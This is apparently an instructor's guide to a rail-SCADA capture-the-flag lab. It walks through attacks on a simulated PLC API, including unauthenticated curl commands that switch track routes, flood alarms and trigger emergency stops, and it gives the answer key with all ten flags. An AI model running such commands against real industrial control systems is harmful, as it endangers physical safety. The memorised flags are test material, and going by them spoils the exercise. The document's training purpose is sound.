# Railroad North — Complete Instructor & Lab Guide
**AWS Instance**: `13.206.102.61`  
**Wireshark**: `https://13.206.102.61:3001` (click Advanced → Proceed on security warning)  

> **DO NOT SHARE THIS FILE WITH STUDENTS** — Contains all CTF answers.

---

##  Service Access Table (AWS) 

| Service | URL | Status Check |
|---|---|---|
| SCADA Dashboard | `http://13.206.102.61:8081` | Should show the track map |
| Master PLC API | `http://13.206.102.61:8085/api/status` | Should return JSON |
| CTF Scoreboard | `http://13.206.102.61:8090` | Should show 10 challenges |
| Wireshark | `https://13.206.102.61:3001` | HTTPS only, click through warning |

---

##  Attack Walkthroughs (Exact Commands)

Students run these from their own laptop terminal. They only need Python 3 installed (no extra packages needed).

### Attack 1: Unauthorized Track Switching
```bash
python scripts/modbus-attack.py
# Select Option 1
```
**What students see:**
- Terminal: `{'requested_route': 'ROUTE_B', 'segment_id': 2, 'success': True}`  
- Dashboard (`http://13.206.102.61:8081`): Segment 2 switches to ROUTE_B. Audit Log shows **YELLOW** `UNAUTHORIZED API CALL`.

**Teaching Point:** The attacker bypassed the SCADA operator UI and talked directly to the PLC API. There is zero authentication. The only reason we caught it is because the SCADA correlates its own commands against what the PLC reports — anything it didn't send is flagged yellow.

**Manual curl version (for advanced students):**
```bash
curl -X POST http://13.206.102.61:8085/api/command -H "Content-Type: application/json" -d '{"segment_id": 2, "route": "ROUTE_B"}'
```

---

### Attack 2: Safety Interlock Bypass / Sensor Spoofing 
```bash
python scripts/modbus-attack.py
# Select Option 2
```
**On AWS:** The Slave PLC ports (8086-8088) are not exposed externally. The script will demonstrate via the Master PLC API instead, sending a route command and showing the interlock response.

**Teaching Point:** In a real attack (like Stuxnet), the attacker spoofs sensor readings so operators see "everything is fine" while the physical process is being destroyed. Our lab simulates this concept — the PLC trusts whatever sensor data it receives.

---

### Attack 3: Alarm Flooding (DoS)
```bash
python scripts/modbus-attack.py
# Select Option 3
```
**What students see:**
- Terminal: Progress bar showing 50 requests firing in rapid succession  
- Dashboard: Audit Log is overwhelmed with YELLOW alerts. Segment 3 flickers between ROUTE_A and ROUTE_B.

**Teaching Point:** This is "Alert Fatigue" — a real SOC attack tactic. When you flood operators with thousands of alerts, they stop reading them, and your REAL attack hides in the noise.

---

### Attack 4: API Fuzzing
```bash
python scripts/modbus-attack.py
# Select Option 4
```
**What students see:**
- Terminal: `{'success': False, 'error': 'Invalid route: ROUTE_XYZ'}`
- The API reveals its error handling. In a real system, verbose error messages help attackers understand the internal logic.

**Teaching Point:** Never expose internal error strings to unauthenticated users. This is CWE-209 (Information Exposure Through an Error Message).

---

### Attack 5: Heartbeat Failure (DoS via Network Kill)
>  **Instructor-only demo.** This requires SSH access to the AWS instance.

```bash
# SSH into the AWS instance, then:
docker stop railroad-slave-plc-1
# Wait 15-20 seconds...
# Dashboard goes into EMERGENCY STOP (all signals RED)

# Recovery:
docker start railroad-slave-plc-1
# Wait 5 seconds, then click "Clear Faults" on the dashboard
```

**Teaching Point:** The PLC tolerates 2 missed heartbeats (network jitter happens). On the 3rd miss, it assumes the worst and stops ALL trains. This is "fail-safe" design — the system fails in the direction that prevents physical harm. Discussion: what if a momentary glitch causes a false E-STOP during peak traffic? That's the tradeoff.

---

##  CTF Answer Key (10 Challenges, 2,700 Points)

### Challenge 1: Network Reconnaissance (100 pts, Easy)
**Question:** Identify the IP address of the Master PLC on the OT network.  
**Flag:** `172.25.0.10`  
**How to solve:** Open Wireshark, capture traffic, filter for HTTP. The Master PLC's internal Docker IP is `172.25.0.10`. Students can also find it in the `docker-compose.yml` or by running `curl http://13.206.102.61:8085/api/status` and noticing the slave health data references internal IPs.

---

### Challenge 2: Protocol Identification (100 pts, Easy)
**Question:** What port does the Master PLC listen on for Modbus TCP?  
**Flag:** `502`  
**How to solve:** Found in the `docker-compose.yml` file. The Master PLC maps port `502` internally for Modbus TCP. Students can also see this in Wireshark by filtering for TCP traffic to port 502.

---

### Challenge 3: Unauthorized Track Switch (200 pts, Medium)
**Question:** Switch Segment 1 to ROUTE_C via API. What is the `requested_route` field value?  
**Flag:** `ROUTE_C`  
**How to solve:**
```bash
curl -X POST http://13.206.102.61:8085/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_C"}'
# Response: {"requested_route": "ROUTE_C", "segment_id": 1, "success": true}
```

---

### Challenge 4: Sensor Spoofing (250 pts, Medium)
**Question:** Spoof the occupancy sensor on Slave PLC 1. What is the exact device name?  
**Flag:** `Occupancy North`  
**How to solve:** The Slave PLC's API uses internal device names (e.g., "Occupancy North"), not the dashboard labels ("Segment 1"). On AWS, the Slave PLC ports aren't exposed externally, so students must inspect the attack script source code (`scripts/modbus-attack.py`) or the SCADA dashboard's JavaScript to find the device name.

---

### Challenge 5: Log Correlation (300 pts, Hard)
**Question:** After running the flood attack, check `/api/status`. What is the `total_commands` count?  
**Flag:** Any number ≥ 50  
**How to solve:**
```bash
# First, run Attack 3 (flood)
python scripts/modbus-attack.py  # Select Option 3

# Then query the status
curl http://13.206.102.61:8085/api/status | python -m json.tool
# Look at the "total_commands" field — it will be >= 50
```
**Note:** The CTF server uses dynamic validation. It accepts any integer ≥ 50 as correct.

---

### Challenge 6: Packet Capture Analysis (300 pts, Hard)
**Question:** Capture Attack 1 in Wireshark. What JSON key specifies the track segment?  
**Flag:** `segment_id`  
**How to solve:**
1. Open Wireshark (`https://13.206.102.61:3001`)
2. Start a capture on the OT network interface
3. Run Attack 1 (`python scripts/modbus-attack.py` → Option 1)
4. In Wireshark, filter: `http.request.method == POST`
5. Right-click the POST request → Follow → TCP Stream
6. Read the JSON body: `{"segment_id": 2, "route": "ROUTE_B"}` — the key is `segment_id`

---

### Challenge 7: Emergency Recovery (200 pts, Medium)
**Question:** Perform a full recovery. What is the `action` field from `/api/emergency/clear`?  
**Flag:** `emergency_cleared`  
**How to solve:**
```bash
# Trigger emergency (or ask instructor to stop a slave PLC)
curl -X POST http://13.206.102.61:8085/api/emergency \
  -H "Content-Type: application/json" \
  -d '{"reason": "CTF test"}'

# Clear it
curl -X POST http://13.206.102.61:8085/api/emergency/clear
# Response: {"action": "emergency_cleared", "success": true}
```

---

### Challenge 8: Safety Interlock Validation (350 pts, Hard)
**Question:** Try to switch Seg 2 to ROUTE_A while Seg 1 is on ROUTE_A. What is the `reason` text?  
**Flag:** `Conflicting routes at junction`  
**How to solve:**
```bash
# Step 1: Set Segment 1 to ROUTE_A
curl -X POST http://13.206.102.61:8085/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_A"}'

# Step 2: Try Segment 2 to ROUTE_A (should be rejected)
curl -X POST http://13.206.102.61:8085/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 2, "route": "ROUTE_A"}'
# Response: {"reason": "Conflicting routes at junction", "requested_route": "ROUTE_A", "segment_id": 2, "success": false}
```
**Note:** The `reason` field is only returned when the command is rejected. The Master PLC code was updated to include this field.

---

### Challenge 9: API Fuzzing (400 pts, Insane)
**Question:** Send an invalid route (`ROUTE_XYZ`). What is the exact error string?  
**Flag:** `Invalid route: ROUTE_XYZ`  
**How to solve:**
```bash
curl -X POST http://13.206.102.61:8085/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_XYZ"}'
# Response: {"error": "Invalid route: ROUTE_XYZ", "success": false}
```

---

### Challenge 10: Deep Memory Forensics (500 pts, Insane)
**Question:** Find the hidden flag in the Master PLC's memory.  
**Flag:** `FLAG{modbus_master_pwned}`  
**How to solve:**
```bash
curl http://13.206.102.61:8085/api/status | python -m json.tool
# Look at the "firmware_notes" field:
# "firmware_notes": "DEBUG_FLAG: FLAG{modbus_master_pwned}"
```
**Note:** The SCADA Dashboard does NOT show this field. Students MUST use `curl` or their browser to hit the raw API endpoint directly. The flag is hidden inside the PLC's status memory as if a previous attacker planted it there.

---

## Troubleshooting

| Problem | Fix |
|---|---|
| Student can't reach any URL | Check they're using `http://13.206.102.61` not `localhost` |
| Wireshark won't load | Must use `https://` (port 3001), and click past the SSL warning |
| Attack script fails | Ensure `TARGET_IP` in `modbus-attack.py` is set to `13.206.102.61` |
| SCADA Dashboard shows all RED | Someone triggered E-STOP. SSH into AWS and run `docker restart railroad-master-plc` |
| CTF scoreboard lost all teams | The CTF server stores state in memory. If the container restarts, all scores reset. Avoid restarting `railroad-ctf` during the competition. |
| Multiple students attacking simultaneously | This is fine and expected — they all share the same PLC. The audit log will show ALL their commands. |
| Student submitted the wrong flag | Flags are case-insensitive. Common mistakes: extra spaces, missing quotes, wrong field name. |

---

## Critical Reminders for Tomorrow

1. **Before the event:** Open ALL URLs yourself to verify they're responding.
2. **Tell your AWS friend:** Do NOT restart any containers during the CTF session (state is in-memory).
3. **Students only need:** A browser and Python 3. No Docker installation needed on their machines.
4. **The attack script** (`scripts/modbus-attack.py`) must be distributed to students. It already points to the AWS IP.
5. **Heartbeat attack** (docker stop) is instructor-only since students don't have SSH access to AWS.
6. **The `reason` field fix** in `master_plc.py` needs to be redeployed to AWS for Challenge 8 to work. Send the updated `master_plc.py` to your AWS admin.
